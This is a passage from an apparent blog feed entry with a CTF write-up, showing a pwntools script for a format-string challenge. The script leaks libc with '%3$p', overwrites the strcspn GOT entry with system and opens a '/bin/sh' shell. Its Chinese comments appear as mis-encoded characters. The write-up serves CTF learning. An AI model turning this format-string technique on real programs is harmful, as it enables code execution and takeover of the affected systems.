+ size + data</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">input_1</span>(<span class="params">payload</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">type</span>(payload) == <span class="built_in">bytes</span>:</span><br><span class="line">        payload = payload.decode()</span><br><span class="line">    payload_ =consume_bytes(<span class="number">5</span>)</span><br><span class="line">    payload_ +=read_string(<span class="string">&quot;11112222&quot;</span>)</span><br><span class="line">    payload_ +=read_string(payload)</span><br><span class="line">    payload_ +=read_string(<span class="string">&quot;ohh good&quot;</span>)</span><br><span class="line">    payload_ +=consume_bytes(<span class="number">10</span>+<span class="number">2</span>)</span><br><span class="line">    <span class="built_in">print</span>(payload_)</span><br><span class="line">    sla(<span class="string">b&quot;Submit replay as hex (use xxd -p -c0 replay.osr | ./analyzer):\n&quot;</span>,payload_)</span><br><span class="line">    ru(<span class="string">b&quot;Player name: &quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> rl()[:-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">leaklibc = input_1(<span class="string">&quot;%3$p&quot;</span>)</span><br><span class="line">info(<span class="string">f&#x27;leaklibc===&gt;<span class="subst">&#123;leaklibc&#125;</span>&#x27;</span>)</span><br><span class="line">libc.address=<span class="built_in">int</span>(leaklibc,<span class="number">16</span>)-<span class="number">0x114887</span></span><br><span class="line">info(<span class="string">f&#x27;libc_base===&gt;<span class="subst">&#123;<span class="built_in">hex</span>(libc.address)&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line"></span><br><span class="line">auto = FmtStr(input_1,offset=<span class="number">14</span>)   <span class="comment">#input_1æ˜¯å¾€addrå†™å…¥valueçš„å€¼ï¼Œoffsetæ˜¯åç§»</span></span><br><span class="line"><span class="comment"># [*] Found format string offset: 14</span></span><br><span class="line"><span class="comment"># one = pack(libc.address + 0xebc81)    #è¿™æ˜¯æŸä¸ªone_gadget</span></span><br><span class="line">auto.write(elf.got[<span class="string">&#x27;strcspn&#x27;</span>],libc.sym.system)  <span class="comment">#å…ˆæ‰“åŒ…ä¸€ä¸ªstrcspnå†™å…¥systemçš„å­—èŠ‚ä¸²</span></span><br><span class="line">auto.execute_writes()      <span class="comment">#ç„¶åå†å†™å…¥</span></span><br><span class="line"></span><br><span class="line">sl(<span class="string">b&quot;/bin/sh&quot;</span>)</span><br><span class="line"></span><br><span class="line">irt()</span><br></pre></td></tr></table></figure><p>æ€»ç»“ åšæ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´çš„æ—¶å€™åº”è¯¥å…ˆæŠŠå‘addrå†™å…¥valueçš„è‡ªåŠ¨å‡½æ•°å†™å‡ºæ¥ï¼ˆä¸è¦æ€•éº»çƒ¦ï¼Œè¿™æ ·ä¹‹åå¯ä»¥èŠ‚çœå¾ˆå¤šçš„éº»çƒ¦ã€‚</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;é¢˜ç›®å¤ç°&quot;&gt;&lt;a href=&quot;#é¢˜ç›®å¤ç°&quot; class=&quot;headerlink&quot; title=&quot;é¢˜ç›®å¤ç°&quot;&gt;&lt;/a&gt;é¢˜ç›®å¤ç°&lt;/h1&gt;&lt;h1 id=&quot;float&quot;&gt;&lt;a href=&quot;#float&quot; class=&quot;headerlink&quot; title=&quot;float&quot;&gt;</summary>
      
    
    
    
    <category term="åšé¢˜è®°å½•" scheme="http://s1nec-1o.github.io/categories/%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
    
    
    <category term="traditional pwn" scheme="http://s1nec-1o.github.io/tags/traditional-pwn/"/>
    
  </entry>
  
</feed>
